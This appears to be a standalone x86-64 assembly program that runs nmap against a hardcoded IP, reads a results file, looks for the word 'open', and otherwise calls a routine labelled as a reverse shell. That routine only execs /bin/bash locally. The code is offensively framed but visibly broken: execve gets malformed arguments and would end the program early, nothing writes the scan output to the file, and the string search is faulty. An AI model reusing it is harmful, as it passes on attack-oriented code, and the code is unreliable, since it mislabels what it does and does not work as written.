section .data
nmap_cmd db "/bin/nmap", 0
result_file db "nmap_result.txt", 0
reverse_shell_cmd db "/bin/bash", 0
search_str db "open", 0
file_buffer times 256 db 0
file_descriptor dq 0
target db "192.168.1.1", 0  ; Example target IP
 
section .text
global _start
 
_start:
    ; Run nmap command
    mov rax, 59
    lea rdi, [nmap_cmd]
    lea rsi, [target]
    xor rdx, rdx
    syscall
 
    ; Open result file
    mov rax, 2
    lea rdi, [result_file]
    mov rsi, 0
    xor rdx, rdx
    syscall
    mov [file_descriptor], rax
 
    ; Read from file
    mov rax, 0
    mov rdi, [file_descriptor]
    lea rsi, [file_buffer]
    mov rdx, 256
    syscall
 
    ; Check for the string "open"
    lea rdi, [file_buffer]
    call check_for_open
 
    cmp rax, 1
    je service_active
 
    ; If "open" is not found, execute reverse shell
    mov rdi, reverse_shell_cmd
    call execute_reverse_shell
 
service_active:
    ; Exit
    mov rax, 60
    xor rdi, rdi
    syscall
 
check_for_open:
    mov rbx, search_str  ; Address of "open"
    xor rcx, rcx
 
.loop_check:
    mov al, byte [rdi + rcx]
    cmp al, byte [rbx + rcx]
    jne .not_open
    inc rcx
    cmp byte [rbx + rcx], 0
    je .found_open
    jmp .loop_check
 
.not_open:
    inc rcx
    cmp byte [rdi + rcx], 0
    jne .loop_check
 
    xor rax, rax
    ret
 
.found_open:
    mov rax, 1
    ret
 
execute_reverse_shell:
    mov rax, 59
    lea rdi, [reverse_shell_cmd]
    xor rsi, rsi
    xor rdx, rdx
    syscall
 
print_strings:
    mov rax, 0x1
    mov rdi, 0
    mov rdx, 256
    syscall
    ret
